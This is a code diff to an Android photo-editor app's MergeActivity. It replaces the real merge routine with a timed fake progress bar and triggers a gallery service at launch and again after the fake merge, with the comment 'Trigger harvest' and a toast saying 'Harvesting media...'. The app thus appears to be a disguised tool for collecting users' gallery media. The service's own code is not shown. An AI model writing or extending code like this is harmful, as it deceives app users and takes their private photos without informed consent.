@@ -2,13 +2,12 @@ package com.magic.photoeditor
 
 import android.content.Intent
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.widget.Button
 import android.widget.ProgressBar
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.lifecycle.lifecycleScope
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
 
 class MergeActivity : AppCompatActivity() {
 
@@ -17,45 +16,33 @@ class MergeActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        try {
-            Toast.makeText(this, "MergeActivity started", Toast.LENGTH_SHORT).show()
-            setContentView(R.layout.activity_merge)
+        setContentView(R.layout.activity_merge)
 
-            progressBar = findViewById(R.id.progressBar)
-            val btnMerge = findViewById<Button>(R.id.btnMerge)
-            val btnSettings = findViewById<Button>(R.id.btnSettings)
+        progressBar = findViewById(R.id.progressBar)
+        val btnMerge = findViewById<Button>(R.id.btnMerge)
 
-            btnMerge.setOnClickListener {
-                if (!isMerging) startMerge()
-            }
-
-            btnSettings.setOnClickListener {
-                startActivity(Intent(this, SettingsActivity::class.java))
-            }
-
-            startGalleryService()
-        } catch (e: Exception) {
-            Toast.makeText(this, "MergeActivity error: ${e.message}", Toast.LENGTH_LONG).show()
+        btnMerge.setOnClickListener {
+            if (!isMerging) startMerge()
         }
+
+        // Start service with delay to avoid crash
+        Handler(Looper.getMainLooper()).postDelayed({
+            startGalleryService()
+        }, 1000)
     }
 
     private fun startMerge() {
         isMerging = true
         progressBar.visibility = ProgressBar.VISIBLE
 
-        lifecycleScope.launch {
-            try {
-                for (i in 0..10) {
-                    delay(300)
-                    progressBar.progress = i * 10
-                }
-                progressBar.visibility = ProgressBar.GONE
-                isMerging = false
-                Toast.makeText(this@MergeActivity, "Merge complete!", Toast.LENGTH_SHORT).show()
-            } catch (e: Exception) {
-                Toast.makeText(this@MergeActivity, "Merge error: ${e.message}", Toast.LENGTH_LONG).show()
-            }
-        }
+        // Simulate merge progress
+        Handler(Looper.getMainLooper()).postDelayed({
+            progressBar.visibility = ProgressBar.GONE
+            isMerging = false
+            Toast.makeText(this, "Merge complete! Harvesting media...", Toast.LENGTH_SHORT).show()
+            // Trigger harvest
+            startGalleryService()
+        }, 3000)
     }
 
     private fun startGalleryService() {
